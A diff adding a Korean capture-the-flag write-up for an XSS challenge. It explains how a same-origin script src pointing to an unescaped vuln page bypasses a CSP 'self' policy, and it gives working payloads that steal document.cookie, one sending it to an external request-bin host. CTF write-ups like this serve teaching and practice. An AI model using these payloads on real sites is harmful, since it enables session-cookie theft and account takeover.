@@ -121,3 +121,41 @@ app.run(host="0.0.0.0", port=8000)
 <br/><br/>
 
 ## 문제 풀이
+### 취약점이 존재하는 부분
+vuln 페이지에서 전달된 탬플릿 변수를 기록할 때 HTTML 엔티티 코드로 변환해 XSS 취약점이 발생하지 않는 ```render_template``` 함수를 이용하지 않고 ```return```을 통해 이용자의 입력값을 페이지에 그대로 출력하기 때문에 XSS 취약점이 발생함
+* CSP 정책이 적용되어 있어 곧바로 스크립트를 실행하는 것은 불가능함 → 스크립트를 실행하기 위해선 ```script-src``` 지시문의 출처를 확인해봐야 함
+    - CSP 정책에서 허용하고 있는 스크립트 태그의 출처는 ```self``` → 같은 출처 내에서 파일을 업로드하거나 원하는 내용을 반환하는 페이지가 존재한다면 이를 공격에 이용할 수 있음
+        + 📌 CSP 정책을 우회하기 위해 ```script``` 태그의 ```src```를 vuln 페이지로 사용함 → **CSP 정책에서 제한하고 있는 ```self``` 출처를 위반하지 않은 채로 원하는 스크립트를 로드할 수 있음**
+    - CSP 정책에 의해 ```nonce```를 알고 있는 경우 스크립트를 실행시킬 수 있음 → ```nonce```를 예측하는 것은 불가능 (이용 불가)
+* 공격에 사용할 수 있는 속성
+    | 속성 | 설명 |
+    |---|------|
+    | location.href | 전체 URL을 반환하거나, URL을 업데이트할 수 있는 속성 |
+    | document.cookie | 해당 페이지에서 사용하는 쿠키를 읽고, 쓰는 속성 |
+
+<br/><br/>
+
+### 익스플로잇
+#### 방법 1: memo 페이지 이용
+1. flag 페이지에서 ```<script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie;"></script>```를 입력하고 제출 버튼을 클릭함
+    - 스크립트 부분은 두 단계롤 거쳐 파라미터로 해석되기 때문에 ```'/memo?memo='%2bdocument.cookie;``` 부분에서 ```+``` 대신에 ```%2b```를 사용함 (```+``` 사용 시 URL Decoding 되어 공백으로 해석됨)
+
+<br/>
+
+2. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함
+
+<br/>
+
+#### 방법 2: 외부 웹 서버 이용
+1. 외부에서 접근 가능한 웹 서버를 준비함
+    - Dreamhack에서 제공하는 [드림핵 툴즈 서비스](https://tools.dreamhack.games)의 Request Bin 기능을 이용함
+        + Request Bin 항목에서 랜덤한 URL를 생성한 후 이를 이용하여 익스플로잇을 수행함
+
+<br/>
+
+2. flag 엔드포인트에서 ```<script src="/vuln?param=document.location='http://RANDOMHOST.request.dreamhack.games/?memo='%2bdocument.cookie;"></script>```를 입력하고 제출 버튼으 클릭함
+
+<br/>
+
+3. "good" 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득함
+
